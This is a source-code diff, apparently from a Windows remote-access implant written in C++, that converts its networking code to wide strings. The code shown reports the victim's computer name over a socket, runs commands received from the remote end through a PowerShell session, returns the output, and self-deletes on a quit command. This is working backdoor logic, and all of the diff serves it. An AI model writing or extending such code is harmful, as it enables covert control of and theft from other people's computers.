@@ -15,62 +15,62 @@ VOID SelfDelete() {
 }
 
 
-VOID PrependStringSize(std::string szData, std::string& szOutput) {
+VOID PrependStringSize(std::wstring wszData, std::wstring& wszOutput) {
     uint32_t uiNetMessageLen;
 
-    uiNetMessageLen = htonl(szData.size());
-    szOutput = std::string(reinterpret_cast<char*>(&uiNetMessageLen), 4);
-    szOutput += szData;
+    uiNetMessageLen = htonl(wszData.size() * sizeof(WCHAR));
+    wszOutput = std::wstring(reinterpret_cast<WCHAR*>(&uiNetMessageLen), sizeof(uint32_t) / sizeof(WCHAR));
+    wszOutput += wszData;
 }
 
 
 VOID SendComputerName(SOCKET sock) {
-    CHAR carrComputerName[MAX_COMPUTERNAME_LENGTH + 1];
+    WCHAR wcarrComputerName[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD dwComputerNameLength;
-    std::string szComputerName;
-    std::string szFinalComputerName;
+    std::wstring wszComputerName;
+    std::wstring wszFinalComputerName;
 
-    dwComputerNameLength = sizeof(carrComputerName);
+    dwComputerNameLength = sizeof(wcarrComputerName);
 
-    if (!GetComputerNameA(carrComputerName, &dwComputerNameLength)) {
+    if (!GetComputerNameW(wcarrComputerName, &dwComputerNameLength)) {
         std::cerr << "GetComputerNameA failed! Error: " << GetLastError() << std::endl;
         return;
 
     }
 
-    szComputerName.append(carrComputerName, dwComputerNameLength);
-    PrependStringSize(szComputerName, szFinalComputerName);
-    send(sock, szFinalComputerName.data(), szFinalComputerName.length(), 0);
+    wszComputerName.append(wcarrComputerName, dwComputerNameLength);
+    PrependStringSize(wszComputerName, wszFinalComputerName);
+    send(sock, reinterpret_cast<const CHAR*>(wszFinalComputerName.data()), wszFinalComputerName.length() * sizeof(WCHAR), 0);
 }
 
 VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
     INT iBytesReceived;
     BOOL bIsRunning;
-    CHAR carrRecvbuf[MAX_BUFFER_SIZE];
+    WCHAR wcarrRecvbuf[MAX_BUFFER_SIZE];
     std::string szCwd;
-    std::string szFinalData;
     std::string szCommandOutput;
+    std::wstring wszFinalData;
 
     bIsRunning = TRUE;
 
     while (bIsRunning) {
-        iBytesReceived = recv(socket, carrRecvbuf, sizeof(carrRecvbuf) - 1, 0);
-        
+        iBytesReceived = recv(socket, reinterpret_cast<CHAR*>(wcarrRecvbuf), sizeof(wcarrRecvbuf) - sizeof(WCHAR), 0);
+
         if (iBytesReceived < 0) {
             break;
         }
 
-        carrRecvbuf[iBytesReceived] = '\0';
-        std::string szCommand(carrRecvbuf);
+        wcarrRecvbuf[iBytesReceived / sizeof(WCHAR)] = '\0';
+        std::string szCommand = wstring_to_utf8(wcarrRecvbuf);
 
-        if (szCommand == QUIT_COMMAND) {
+        if (szCommand == wstring_to_utf8(QUIT_COMMAND)) {
             bIsRunning = FALSE;
             SelfDelete();
         }
         else {
             szCommandOutput = psSession.RunCommand(szCommand);
-            PrependStringSize(szCommandOutput, szFinalData);
-            send(socket, szFinalData.data(), szFinalData.length(), 0);
+            PrependStringSize(utf8_to_wstring(szCommandOutput), wszFinalData);
+            send(socket, reinterpret_cast<const CHAR*>(wszFinalData.data()), wszFinalData.length() * sizeof(WCHAR), 0);
         }
     }
 }
